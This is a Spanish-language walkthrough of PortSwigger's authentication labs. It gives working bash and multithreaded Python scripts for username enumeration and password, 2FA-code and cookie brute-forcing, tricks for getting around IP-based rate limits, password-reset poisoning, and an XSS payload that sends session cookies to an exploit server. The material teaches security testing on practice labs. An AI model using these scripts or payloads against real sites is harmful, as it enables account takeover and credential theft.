# Authentication (Labs)

### Username enumeration via different responses

En este caso tenemos que intentar enumerar los usuarios que existen y a continuación la contraseña de dicho/s usuario/s.

Lo primero es comprobar si existe alguna vía para poder enumerar los usuarios, en este caso cuando el usuario es incorrecto te avisa la propia web con un mensaje de "Invalid username" así que podemos realizar un ataque de fuerza bruta para poder conseguir los usuarios válidos.

Podríamos hacerlo a través de enviar la petición de inicio de sesión al intruder de Burpsuite, pero en mi caso cómo tengo el community y es lento cómo el caballo del malo voy a hacer un poco de scripting.

Es sencillo, enviar una petición POST de login iterando en un diccionario de usuarios "Proporcionado por el propio ejercicio" y filtrar los resultados correctos mediante el mensaje de error que nos da la propia web.

En Bash lo haríamos de la siguiente forma:

```bash
#!/bin/bash

URL="https://ac2f1f351fdb30c8c0f030cf00910092.web-security-academy.net/login"

while read -r i; do
        no_valido=$(curl -s -d "username=$i&password=asd" $URL | grep -oP Invalid)
        if [ "$no_valido" != "Invalid" ]; then
                echo $i
        fi
        no_valido=""
done < usuarios
```

Y ahora hacemos algo similar pero para las contraseñas, podemos mejorar un poco nuestro script ya que seguramente lo utilizaremos en otros laboratorios de PortSwigger.

En Bash:

```bash
#!/bin/bash

URL="https://ac2f1f351fdb30c8c0f030cf00910092.web-security-academy.net/login"

usuarios_bf () {
	while read -r i; do
		no_valido=$(curl -s -d "username=$i&password=asd" $URL | grep -oP Invalid)
		if [ "$no_valido" != "Invalid" ]; then
			echo $i
		fi
		no_valido=""
	done < usuarios
}

pass_bf () {
usuario_correcto="ar"
        while read -r i; do
                no_valido=$(curl -s -d "username=$usuario_correcto&password=$i" $URL | grep -oP Incorrect)
                if [ "$no_valido" != "Incorrect" ]; then
                        echo $i
			no_valido=""
			break
                fi
                no_valido=""
        done < pass
}

if [ "$1" == "user" ]; then
	usuarios_bf
elif [ "$1" == "pass" ]; then
	pass_bf
else
	echo -e "Utiliza user o pass en función de si quieres realizar fuerza bruta en uno u otro\nEjemplo: fuerzabruta.sh user"
fi

```

En Python:

```python
#!/usr/bin/python3

import argparse
import requests
from pwn import *
from bs4 import BeautifulSoup

def lista(archivo):
	f = open("%s" % archivo)
	temp = f.read().splitlines()
	f.close()
	return temp

def comprobar(usuario,passw,valor):
	data_post = {
		'username': usuario,
		'password': passw
	}
	content = requests.post(url, data=data_post)
	soup = BeautifulSoup(content.text, 'html.parser')
	soup2 = soup.find("p", class_="is-warning")
	if soup2 is None:
		return 1
	else:
		valor_grep = soup2.get_text()
		if valor_grep != valor:
			return 1

def usuarios_bf ():
	lista_usuarios = lista("usuarios")
	for i in lista_usuarios:
		p1.status("%s" % i)
		if comprobar("%s" % i,"asd","Invalid username"):
			log.info("%s" % i)

def pass_bf ():
	lista_usuarios = lista("pass")
	for i in lista_usuarios:
		p1.status("%s" % i)
		if comprobar("%s" % usuario_correcto,"%s" % i,"Incorrect password"):
			log.info("%s" % i)
			break

#Marcamos los argumentos
parser = argparse.ArgumentParser(description='Programa para hacer BruteForce en PortSwigger.', add_help=False)
parser.add_argument("-h", "--help", action='help', default=argparse.SUPPRESS, help='Muestra la ayuda')
grupo = parser.add_mutually_exclusive_group()
grupo.add_argument("-u", "--usuarios", help="Realiza Brute Force sobre Usuarios", action="store_true")
grupo.add_argument("-p", "--passwords", help="Realiza Brute Force sobre contraseñas", action="store_true")
parser.add_argument("-U", "--url", help="Introduce la URL", required=True)
parser.add_argument("-c", "--correctuser", help="Introduce un usuario correcto para sacar la contraseña")
args = parser.parse_args()

url = args.url
if args.usuarios:
	p1 = log.progress("Usuarios")
	usuarios_bf()
elif args.passwords:
	if args.correctuser is None:
		parser.error('Se requiere un usuario correcto')
	else:
		usuario_correcto = args.correctuser
		p1 = log.progress("Contraseñas")
		pass_bf()
else:
	print('Utiliza -h o --help para ver el mensaje de Ayuda')
```

#### AÑADIDO

Me he puesto a aprender a hacer MultiThreading en Python y maravillosamente he conseguido que el script de Python que en este ejercicio tardaba 24 segundos en acabar tarde menos de un segundo, únicamente milésimas:

```python
#!/usr/bin/python3

import argparse
import requests
from pwn import *
from bs4 import BeautifulSoup
from threading import Thread
from queue import Queue

def def_handler(sig, frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Worker(Thread):

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                # An exception happened in this thread
                print(e)
            finally:
                # Mark this task as done, whether an exception happened or not
                self.tasks.task_done()

class ThreadPool

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        self.tasks.join()

def lista(archivo):
	f = open("%s" % archivo)
	temp = f.read().splitlines()
	f.close()
	return temp


def comprobar(usuario, passw, valor):
	p1.status("%s" % usuario)
	p2.status("%s" % passw)
	data_post = {
		'username': usuario,
		'password': passw
	}
	content = requests.post(url, data=data_post)
	soup = BeautifulSoup(content.text, 'html.parser')
	soup2 = soup.find("p", class_="is-warning")
	if soup2 is None:
		log.info("La prueba ha sido correcta con usuario %s y contraseña %s" % (usuario, passw))
	else:
		valor_grep = soup2.get_text()
		if valor_grep != valor:
			log.info("La prueba ha sido correcta con usuario %s y contraseña %s" % (usuario, passw))

def usuarios_bf ():
	lista_usuarios = lista("usuarios")
	pool = ThreadPool(20)
	for i in lista_usuarios:
		pool.add_task(comprobar, i, "asd", "Invalid username")
	pool.wait_completion()

def pass_bf ():
	lista_pass = lista("pass")
	pool = ThreadPool(20)
	for i in lista_pass:
		pool.add_task(comprobar, usuario_correcto, i, "Incorrect password")
	pool.wait_completion()

#Marcamos los argumentos
parser = argparse.ArgumentParser(description='Programa para hacer BruteForce en PortSwigger.', add_help=False)
parser.add_argument("-h", "--help", action='help', default=argparse.SUPPRESS, help='Muestra la ayuda')
grupo = parser.add_mutually_exclusive_group()
grupo.add_argument("-u", "--usuarios", help="Realiza Brute Force sobre Usuarios", action="store_true")
grupo.add_argument("-p", "--passwords", help="Realiza Brute Force sobre contraseñas", action="store_true")
parser.add_argument("-U", "--url", help="Introduce la URL", required=True)
parser.add_argument("-c", "--correctuser", help="Introduce un usuario correcto para sacar la contraseña")
args = parser.parse_args()

url = args.url
p1 = log.progress("Usuarios")
p2 = log.progress("Contraseñas")
if args.usuarios:
	usuarios_bf()
elif args.passwords:
	if args.correctuser is None:
		parser.error('Se requiere un usuario correcto')
	else:
		usuario_correcto = args.correctuser
		pass_bf()
else:
	print('Utiliza -h o --help para ver el mensaje de Ayuda')

```

Aún podrían añadirse argumentos para seleccionar el número de hilos, podríamos mandar mensajes de error cuando estuviésemos haciendo más peticiones de las soportadas y un largo etc... Pero no quiero crear un nuevo Hydra ;)

### Username enumeration via subtly different responses

Empecemos con la sinceridad absoluta, en este caso lo primero que hice fue probar un usuario y contraseña cualquiera para ver la respuesta fallida la cual era "Invalid username or password." De primeras deduje que no iba a poder hacer enumeración de usuario y dado que gracias a trabajar con multithreading en el ejercicio anterior podía probar todos los usuarios con todas las contraseñas lancé directamente el ataque:

```
while read -r i;do;./fuerzabrutathread.py -U https://ac361f421ee1fd92c160568500670023.web-security-academy.net/login -p -c $i;done < usuariostmp
```

Pero me di cuenta que al llegar al usuario albuquerque empezó a darme por correctas todas las contraseñas. Es decir, que el usuario albuquerque tenía algo distinto a los demás, de hecho el laboratorio se dio por terminado ya que uno de los intentos de contraseña fue correcto, pero cómo quería descubrir cuál era comprobé cual era la diferencia del mensaje y resulta que había un pequeño cambio "Invalid username or password "

Así que cambiando el mensaje y probando únicamente con el usuario albuquerque conseguí la contraseña:

```
./fuerzabrutathread.py -U https://ac361f421ee1fd92c160568500670023.web-security-academy.net/login -p -c albuquerque
```

### Username enumeration via response timing

De casualidad conseguí acabarlo, se supone que la idea de este laboratorio es que dependiendo del tiempo de respuesta de un usuario correcto o incorrecto podríamos llegar a enumerarlos. El problema está en que tanto con Burpsuite cómo mediante script las diferencias de tiempo que me dan de Delay son mínimas.

Por suerte probé un par de los más altos y uno de ellos fue el correcto, pero mediante script no encontré ninguna diferencia, copio por aquí el cambio realizado al script que ya compartí en el primer ejercicio por si alguien quiere hacer pruebas:

```python
def comprobartiempo(usuario, passw, valor, ip):
	p1.status("%s" % usuario)
	p2.status("%s" % passw)
	data_post = {
		'username': usuario,
		'password': passw
	}
	cabecera = {
		'X-Forwarded-For': ip
	}
	content = requests.post(url, data=data_post, headers=cabecera)
	tiempo = content.elapsed.total_seconds() * 1000
	log.info("%s : %s" % (usuario, tiempo))

```

El X-Forwarded-For es una cabecera que nos permite saltarnos el baneo de IP que realiza cómo medida de seguridad el servidor.

Por otro lado el content.elapsed.total\_seconds() permite ver el número en segundos, lo múltiplico por 1000 para hacerlo más legible a mi vista por si conseguía encontrar algo.

### Broken brute-force protection, IP block

En este caso vemos que cada 4 intentos nos bloquea la IP durante un minuto, sin embargo resulta que si entramos con un usuario y contraseña correctos podemos reiniciar dicho contador.

Sabiendo esto parece bastante fácil, probamos 3 opciones y la cuarta logueamos con nuestro usuario y contraseña para reiniciar dicho contador. Por supuesto he intentado hacerlo mediante hilos para que fuese extremadamente rápido pero he sido completamente incapaz.

Los hilos al ser concurrentes y no hacerlo en orden no nos permiten, al menos de las formas que he intentado, hacer una petición correcta siempre en el cuarto intento. (Si a alguien se le ocurre o sabe cómo hacerlo, por favor, compártemelo estaré eternamente agradecido)

Así que viendo después de varias horas que no era capaz de hacerlo de ese modo simplemente he hecho un par de cambios a nuestro script de bash:

```
#!/bin/bash
URL="https://ac221f861ed91ee9c0c70ca200d70029.web-security-academy.net/login"
pass_bf () {
usuario_correcto="carlos"
contador=0
        while read -r i; do
                ((contador=contador+1))
                if [ $contador -eq 4 ]; then
                        peticioncorrecta=$(curl -L -s -d "username=wiener&password=peter" -c cookie.txt $URL)
                        contador=1
                fi
                no_valido=$(curl -s -d "username=$usuario_correcto&password=$i" $URL | grep -oP Incorrect)
                if [ "$no_valido" != "Incorrect" ]; then
                        echo $i
                        no_valido=""
                fi
                no_valido=""
        done < pass
}

pass_bf

```

Básicamente pongo un contador que hace que siempre en el cuarto intento entre cómo el usuario wiener de forma correcta. Se que la forma para hacerlo no ha sido la más elegante, pero si efectiva y rápida.

### Username enumeration via account lock

En esta ocasión podemos enumerar los usuarios ya que parece ser que si hacemos más de tres intentos con un usuario correcto nos bloqueará al usuario, pero si lo hacemos con un incorrecto no. Sabiendo esto únicamente tenemos que multiplicar por 4 nuestra lista de usuarios para que se repitan todos 4 veces y lanzar nuestro script:

```
[v] Usuarios: autodiscover
[/.......] Contraseñas: asd
[*] La prueba ha sido correcta con usuario auto y contraseña asd
```

A continuación ya simplemente sacamos la contraseña, parece que tardaríamos muchísimo por los tiempos de espera cada vez que lo bloquee, pero realmente si lanzamos por ejemplo el script nos damos cuenta que hay un resultado que no lanza mensaje de alerta. Así que lo tenemos

### Broken brute-force protection, multiple credentials per request

Este me pareció muy divertido, en primer lugar si observamos la request que se genera cuando intentamos loguearnos vemos que envía como un JSON, eso quiere decir que podríamos enviar muchas credenciales en un solo intento:

```
{
    "username":"carlos",
    "password": [
    "pass1",
    "pass2",
    "pass3"...
    ]
```

Por supuesto no voy a meter todas las contraseñas a mano, así que rápidamente me cree un documento con lo que necesitaba:

```
while read -r i;do;echo -e "\"$i\"," >> tmp.txt;done < pass
```

Y ahora simplemente copiar en Burpsuite con la request interceptada, abrir y cerrar el corchete y laboratorio acabado.

### 2FA simple bypass

Nos proporcionan un usuario y contraseña, usuario- carlos y contraseña-montoya. Parece ser que cuando intentas loguearte lo que ocurre es que te pide un doble factor de autenticación.

![Doble factor de autenticación](<../.gitbook/assets/image (31) (1) (1).png>)

¿Qué ocurre si vemos la petición por Burpsuite? Nos damos cuenta que cuando introducimos usuarios y contraseña nos establece una cookie de sesión. Quizás ya estamos dentro por lo que lo único que tenemos que hacer es no escribir ningún código e intentar navegar por la web.

Efectivamente ya estamos dentro sin introducir el segundo factor, ¡Muy sencillo!

### 2FA broken logic

No puedo acceder a día 07/12/2021

### 2FA bypass using a brute-force attack

Cómo siempre vamos a intentar en primer lugar comprobar cómo se realizan las peticiones, los mecanismos de seguridad, etc...

Tras hacerlo vemos lo siguiente:

* Existe un mecanismo CSRF, es decir, que necesitamos un token único que nos permitirá enviar las credenciales de usuario el cual se envía desde un campo oculto en la sección de _Login_.
* 2 Intentos de código 2FA antes de que la web haga un _Logout_ forzado.
* Es un código de 4 dígitos.

Por lo que vamos a hacerlo de dos formas, a través de script y a través de Burpsuite para aprender a utilizar las macros.

#### ¿Qué necesitamos para el script?

* Captar el CSRF.
* Enviar petición de Login y obtener la Cookie de sesión.
* Crear un diccionario de contraseñas con 4 dígitos.
* Realizar dos pruebas de código de 4 dígitos.
* Repetir proceso.

Para crear el diccionario voy a utilizar la [herramienta _Crunch_](../herramientas/fuerza-bruta/diccionario-personalizado.md#crunch) con la siguiente línea:

```
crunch 4 4 -t %%%% > 2FAdict
```

Y aquí va el script en Python, con multihilos por supuesto:

```python
#!/usr/bin/python3

import requests
from pwn import *
from bs4 import BeautifulSoup as bs
from threading import Thread
from queue import Queue

url = "https://ac761fcd1eb1656ec0be4eea00f00049.web-security-academy.net/login"
url2 = "https://ac761fcd1eb1656ec0be4eea00f00049.web-security-academy.net/login2"

def def_handler(sig, frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Worker(Thread):

	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try:
				func(*args, **kargs)
			except Exception as e:
				print(e)
			finally:
				self.tasks.task_done()

class ThreadPool:

	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads):
			Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def map(self, func, args_list):
		for args in args_list:
			self.add_task(func, args)

	def wait_completion(self):
		self.tasks.join()



def lista(archivo):
	f = open("%s" % archivo)
	temp = f.read().splitlines()
	f.close()
	return temp

def capturaCookieThread(passw):
	p1.status("%s" % passw)
	sesion = requests.Session()
	content = sesion.get(url)
	soup = bs(content.text, 'html.parser')
	csrf = soup.find("input", {'name': 'csrf'}).get('value')
	data_post = {
		'username' : 'carlos',
		'password' : 'montoya',
		'csrf' : csrf
	}
	sesion.post(url, data = data_post)
	content = sesion.get(url2)
	soup = bs(content.text, 'html.parser')
	csrf = soup.find("input", {'name': 'csrf'}).get('value')
	data_post = {
	'csrf' : csrf,
	'mfa-code' : passw
	}
	content = sesion.post(url2, data = data_post)
	soup = bs(content.text, 'html.parser')
	soup = soup.find("p", class_="is-warning")
	p2.status("%s" % soup)
	if soup is None:
		log.info("La prueba ha sido correcta con 2FA %s" % (passw))
		log.info("La cookie de sesion es %s" % (sesion.cookies))

def capturaHilos():
	fauth = lista("2FAdict")
	pool = ThreadPool(20)
	for i in fauth:
		pool.add_task(capturaCookieThread, i)
	pool.wait_completion()


p1 = log.progress("2FA")
p2 = log.progress("Warning")
capturaHilos()
```

Lo he hecho un poco rápido así que es mejorable, de hecho podríais hacer un condicional en el bucle haciendo como return un booleano para que en el momento que encuentre el correcto pare directamente. Yo en mi caso me quedé delante y paré el script en cuanto encontró un 2FA adecuado.

![Output del script](<../.gitbook/assets/image (32) (1).png>)

Ahora simplemente tenemos que navegar cambiando la cookie de sesión, en mi caso la cambié con la extensión "EditThisCookie", veremos cómo efectivamente hemos conseguido entrar en la cuenta:

![Demostración de que estamos dentro](<../.gitbook/assets/image (27).png>)

#### Burpsuite

Con Burpsuite podemos utilizar las macros para hacer algo similar a esto, lo único que si no tienes la versión pro tardarás mucho en realizar un ataque de fuerza bruta.

Para hacer la macro tenemos que irnos a:

**Project option --> Sessions --> Session Handling Rules --> Add**

![Session Handling Rules Burpsuite](<../.gitbook/assets/image (31) (1).png>)

Tras esto vamos a Scope e Incluimos todas, podríamos marcar que sólo fuesen en esta web si quisiésemos:

![Scope Macro](<../.gitbook/assets/image (34).png>)

A continuación en la pestaña "Details" Dónde pone "Rule Action", pulsamos sobre "Add" --> "Run a Macro"

![Run a Macro](<../.gitbook/assets/image (32).png>)

Dónde pone Select Macro pulsamos sobre add y tendríamos que seleccionar:

* Una petición GET al login --> Para obtener el CSRF
* Una petición POST al login --> Para obtener una cookie de sesión para el 2FA
* Una petición GET al login2 --> Para obtener el CSRF del login 2FA

Teniendo creada dicha macro con el intercept on podemos mandar una petición post al login2 y enviarlo al intruder.

En positions pulsamos clear, seleccionamos únicamente el valor del mfa-code y pulsamos sobre add.

En la pestaña de Payloads debemos poner como en la imagen:

![Pestaña Payloads](<../.gitbook/assets/image (33).png>)

A continuación en Resource Pool ponemos un "Maximum concurrent requests" en 1 y comenzamos el ataque. En el momento que veamos un "Status" 302 es que lo hemos conseguido.

### Brute-forcing a stay-logged-in cookie

En este caso si miramos a través de Burpsuite cuando marcamos la opción "stay logged in" nos proporciona una cookie de sesión que se mantiene tras cerrar el navegador.

Con nuestro usuario probamos a ver cómo es dicha cookie

```
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Si lo que hacemos es un decode desde base64 tenemos:

```bash
echo -n "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d

wiener:51dc30ddc473d43a6011e9ebba6ca770%
```

Y parece ser que lo que lo acompaña es la contraseña hasheada en MD5:

```bash
51dc30ddc473d43a6011e9ebba6ca770 --> peter

echo -n "peter" | md5sum

51dc30ddc473d43a6011e9ebba6ca770
```

Entonces lo único que tenemos que hacer es fuerza bruta a través de las cookies, ya sabemos que podemos hacerlo a través de Burpsuite, pero con nuestros multihilos vamos mucho más rápido.

En mi caso he preferido comenzar creando un diccionario de cookies para la fuerza bruta, sabemos que es "usuario:contraseñaenMD5" todo en base64, por lo que en primer lugar he realizado el MD5 de todo nuestro diccionario de contraseñas.

```bash
while read -r i; do; md5=$(echo -n $i | md5sum | tr -d "-" | tr -d "\ "); echo "carlos:$md5" >> usuariosMD5; done < usuarios
```

IMPORTANTE: el echo -n para evitar que coja el salto de línea a la hora de hacer el MD5, tuve problemas con esto y no sabía donde estaba el error.

A continuación nuestra cadena en base64 y ya tenemos nuestro diccionario.

```bash
while read -r i; do; echo -n $i | base64 >> usuariocarlosbase64 ; done < usuariosMD5
```

Una vez tenemos esto simplemente tenemos que iterar entre las distintas cookies y buscar algo que nos demuestre que hemos conseguido entrar, en mi caso he utilizado un div que sólo está cuando has entrado realmente.

```python
#!/usr/bin/python3

import re
import requests
from pwn import *
from bs4 import BeautifulSoup
from threading import Thread
from queue import Queue

def def_handler(sig, frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
class Worker(Thread):
	def __init__(self,tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()


	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try:
				func(*args, **kargs)
			except Exception as e:
				print(e)
			finally:
				self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads):
			Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def map(self, func, args_list):
		for args in args_list:
			self.add_task(func, args)

	def wait_completion(self):
		self.tasks.join()

def lista(archivo):
	f = open("%s" % archivo)
	temp = f.read().splitlines()
	f.close()
	return temp

def comprobar(cook):
	galleta = {
		"stay-logged-in": "%s" % cook
	}
	p1.status("%s" % galleta)
	sesion = requests.Session()
	content = sesion.get(url, cookies=galleta)
	soup = BeautifulSoup(content.text, 'html.parser')
	soup2 = soup.find("div", {'id': 'account-content'})
	if soup2 is None:
		p2.status("%s" % soup2)
	else:
		p2.status("%s" % soup2)
		log.info("La prueba ha sido correcta con la cookie --> %s" % galleta)

def fuerzabruta():
	lista_cookie = lista("usuariocarlosbase64")
	pool = ThreadPool(20)
	for i in lista_cookie:
		pool.add_task(comprobar, i)
	pool.wait_completion()

url = "https://ace01f951eb2b39bc09c86ed00ae000d.web-security-academy.net/my-account"
p1 = log.progress("Cookie")
p2 = log.progress("Mensaje")
fuerzabruta()

```

![Output del script](<../.gitbook/assets/image (35).png>)

### Offline password cracking

En esta ocasión nos dicen que tenemos en primer lugar que robar la cookie "stay-logged-in" a través de una vulnerabilidad XSS que encontramos en el apartado de comentarios.

Cómo ya hemos hecho los [laboratorios de XSS](cross-site-scripting-labs.md#exploiting-cross-site-scripting-to-steal-cookies) lo tenemos relativamente sencillo ya que sabemos por donde van los tiros. En este caso tenemos un servidor de exploit así que podemos hacerlo sencillo y no cómo nos ocurrió en los otros laboratorios.

Por lo que envíamos el siguiente Payload en la sección de comentarios.

```
<script>
document.location='https://exploit-ac241fc11f7c3548c01d862b01fe00ac.web-security-academy.net/robandocookie.php?c='+document.cookie;
</script>
```

A continuación podemos ir a los logs de nuestro exploit server y nos encontramos lo siguiente:

```
"GET /robandocookie.php?c=secret=X8dcGjicKxMg700M8hDeAoaa5V4slTAm;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1"

#Por lo que tenemos
stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

Ya sabemos cómo funciona, base64 y a continuación MD5:

```
echo -n "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" | base64 -d

carlos:26323c16d5f4dabff3bb136f2460a943
```

Podríamos pasar "JohnTheReaper" o "Hashcat" y a través de un diccionario sacarlo, pero cómo sabemos que es MD5 y que existen muchos servicios online que ya nos han hecho el trabajo buscamos uno y encontramos que la contraseña es "onceuponatime"

Entramos cómo el usuario "carlos" y borramos su cuenta para acabar el laboratorio.

### Password reset broken logic

En este caso tenemos el típico formulario de "¿Has olvidado tu contraseña?" cuando le damos nos dice que nos han enviado un correo con una URL para cambiar la contraseña, aquí vamos a comenzar a interceptar por Burpsuite.

![Burpsuite](<../.gitbook/assets/image (31).png>)

Cómo vemos a la hora de cambiar la contraseña estamos mandando por detrás también el nombre de usuario ¿Qué ocurriría si en vez de "wiener" ponemos "carlos"?

¿Tan fácil? ;)

### Password reset poisoning via middleware

Esta es una de esas ocasiones en las que aprendes algo nuevo porque estás más perdido que un pulpo en un garaje. En este caso no podemos hacer igual que antes ya que el token está asociado a un usuario. Tampoco parece que el token pueda generarse de una forma sencilla.

Al final tuve que mirar que para poder continuar con el laboratorio hay que añadir a la petición del token un X-Forwarded-Host cómo en la imagen. Además la supuesta víctima pulsará cada link de cada mail que reciba.

![Burpsuite](<../.gitbook/assets/image (21).png>)

Si queréis hacer la prueba sobre qué está pasando podéis utilizar al usuario wiener. Veréis que se genera una URL del servidor que añadas en X-Forwarded-Host. Cómo hemos dicho que la supuesta víctima pulsa todos los enlaces podremos acceder al token de cambio de contraseña en el log de nuestro servidor.

Simplemente tenemos que cambiar el token a la hora de cambiar la contraseña y lo tenemos hecho.

### Password brute-force via password change

En este caso podemos enumerar las contraseñas correctas, si nos fijamos en las peticiones por Burpsuite lo que vemos es que podemos intercambiar el usuario del cual estamos cambiando la contraseña. Además cuando la contraseña actual que damos es incorrecta nos aparece el mensaje "Current password is incorrect"

Por lo que utilizando nuestros ataques de fuerza bruta anteriores con unos pocos cambios podemos buscar la contraseña correcta:

```
#Cambios en la función comprobar
def comprobar(usuario, passw, valor):
        p1.status("%s" % usuario)
        p2.status("%s" % passw)
        #Añadimos los valores POST
        data_post = {
                'username': usuario,
                'current-password': passw,
                'new-password-1': 'lolo',
                'new-password-2': 'meco'
        }
        #Añadimos las cookies de sesión manualmente
        galleta = {
                'session': 'XLSoNSXR564eDRkn8t0UTxQvuOgp2orh',
                'session': 'htUhzwkE54JF9XoyqHKpDsUf75VlhzlM'
        }
        content = requests.post(url, data=data_post, cookies=galleta)
        soup = BeautifulSoup(content.text, 'html.parser')
        soup2 = soup.find("p", class_="is-warning")
        if soup2 is None:
                log.info("La prueba ha sido correcta con usuario %s y contraseña %s" % (usuario, passw))
        else:
                valor_grep = soup2.get_text()
                if valor_grep != valor:
                        log.info("La prueba ha sido correcta con usuario %s y contraseña %s" % (usuario, passw))
```

Iniciamos nuestro programita

```
./fbtfin.py -U "https://ac691fac1e889ca4c0811d7700e20045.web-security-academy.net/my-account/change-password" -p -c "carlos"
```

![Output](<../.gitbook/assets/image (28).png>)

¡Hacemos la prueba y efectivamente tenemos la contraseña! Hemos acabado los laboratorios de autenticación.
